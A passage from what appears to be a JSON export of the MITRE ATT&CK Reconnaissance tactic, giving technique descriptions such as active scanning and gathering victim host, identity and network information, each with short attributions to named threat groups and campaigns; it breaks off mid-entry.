{"tactics": [{"name": "Reconnaissance", "description": "The adversary is trying to gather information they can use to plan future operations.Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.", "id": "TA0043", "techniques": [{"name": "Active Scanning", "description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.", "detailed_description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).", "id": "T1595", "examples": [{"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest."}], "sub_techniques": [{"name": "Scanning IP Blocks", "description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.", "detailed_description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\nAdversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).", "id": "T1595.001", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has scanned specific lists of target IP addresses."}]}, {"name": "Vulnerability Scanning", "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.", "detailed_description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).", "id": "T1595.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has performed large-scale scans in an attempt to find vulnerable servers."}, {"id": "G0016", "name": "APT29", "description": "APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit."}, {"id": "G0096", "name": "APT41", "description": "APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228)."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API."}, {"id": "G0123", "name": "Volatile Cedar", "description": "Volatile Cedar has performed vulnerability scans of the target server."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern has used remotely-hosted instances of the Acunetix vulnerability scanner."}]}, {"name": "Wordlist Scanning", "description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).", "detailed_description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.", "id": "T1595.003", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 leverages various tools and frameworks to brute-force directories on web servers."}, {"id": "G0123", "name": "Volatile Cedar", "description": "Volatile Cedar has used DirBuster and GoBuster to brute force web directories and DNS subdomains."}]}]}, {"name": "Gather Victim Host Information", "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).", "detailed_description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).\nAdversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary\u2019s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.", "id": "T1592", "examples": [{"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted pre-compromise reconnaissance for victim host information."}], "sub_techniques": [{"name": "Hardware", "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).", "detailed_description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).", "id": "T1592.001", "examples": []}, {"name": "Software", "description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).", "detailed_description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).", "id": "T1592.002", "examples": [{"id": "G0138", "name": "Andariel", "description": "Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has captured the user-agent strings from visitors to their phishing sites."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts."}]}, {"name": "Firmware", "description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).", "detailed_description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).", "id": "T1592.003", "examples": []}, {"name": "Client Configurations", "description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.", "detailed_description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).", "id": "T1592.004", "examples": [{"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments."}]}]}, {"name": "Gather Victim Identity Information", "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.", "detailed_description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames. Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).", "id": "T1589", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has conducted targeted surveillance against activists and bloggers."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has researched employees to target for social engineering attacks."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has identified specific potential victims at targeted organizations."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group conducted extensive reconnaissance research on potential targets."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors targeted people based on their organizational roles and privileges."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has identified ways to engage targets by researching potential victims' interests and social or professional contacts."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has gathered victim identify information during pre-compromise reconnaissance. "}], "sub_techniques": [{"name": "Credentials", "description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.", "detailed_description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.  Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).\nCredential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).", "id": "T1589.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has harvested user's login credentials."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider sent phishing messages via SMS to steal credentials."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has collected compromised credentials to use for targeting efforts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments."}]}, {"name": "Email Addresses", "description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.", "detailed_description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).", "id": "T1589.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can check for the existence of user email addresses using public Microsoft APIs."}, {"id": "G0050", "name": "APT32", "description": "APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has gathered targeted individuals' e-mail addresses through open source research and website contact forms."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has collected e-mail addresses for users they intended to target."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has targeted executives, human resources staff, and IT personnel for spearphishing."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet gathered victim email address information for follow-on phishing activity."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear gathered victim email information in advance of phishing operations for targeted attacks."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has targeted the personal emails of key network and IT staff at victim organizations."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution utilizes thread spoofing of existing email threads in order to execute spear phishing operations."}]}, {"name": "Employee Names", "description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.", "detailed_description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).", "id": "T1589.003", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has collected victim employee name information."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's research of potential victim organizations included the identification and collection of employee information."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has collected lists of names for individuals from targeted organizations."}]}]}, {"name": "Gather Victim Network Information", "description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.", "detailed_description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).", "id": "T1590", "examples": [{"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has downloaded tools, such as the Advanced Port Scanner utility and Lansweeper, to conduct internal reconnaissance of the victim network. Indrik Spider has also accessed the victim\u2019s VMware VCenter, which had information about host configuration, clusters, etc."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted extensive pre-compromise reconnaissance to learn about the target organization\u2019s network."}], "sub_techniques": [{"name": "Domain Properties", "description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.", "detailed_description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).", "id": "T1590.001", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can gather information about a tenant\u2019s domains using public Microsoft APIs."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack."}]}, {"name": "DNS", "description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.", "detailed_description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).\nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.", "id": "T1590.002", "examples": []}, {"name": "Network Trust Dependencies", "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.", "detailed_description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).", "id": "T1590.003", "examples": []}, {"name": "Network Topology", "description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.", "detailed_description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).", "id": "T1590.004", "examples": [{"id": "G1016", "name": "FIN13", "description": "FIN13 has searched for infrastructure that can provide remote access to an environment for targeting efforts."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted extensive reconnaissance of victim networks including identifying network topologies."}]}, {"name": "IP Addresses", "description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.", "detailed_description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).", "id": "T1590.005", "examples": [{"id": "G0138", "name": "Andariel", "description": "Andariel has limited its watering hole attacks to specific IP address ranges."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has captured the IP addresses of visitors to their phishing sites."}]}, {"name": "Network Security Appliances", "description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.", "detailed_description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).", "id": "T1590.006", "examples": [{"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has identified target network security measures as part of pre-compromise reconnaissance."}]}]}, {"name": "Gather Victim Org Information", "description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.", "detailed_description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).", "id": "T1591", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has gathered information on victim organizations through email and social media interaction."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted extensive reconnaissance pre-compromise to gain information about the targeted organization."}], "sub_techniques": [{"name": "Determine Physical Locations", "description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.", "detailed_description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are 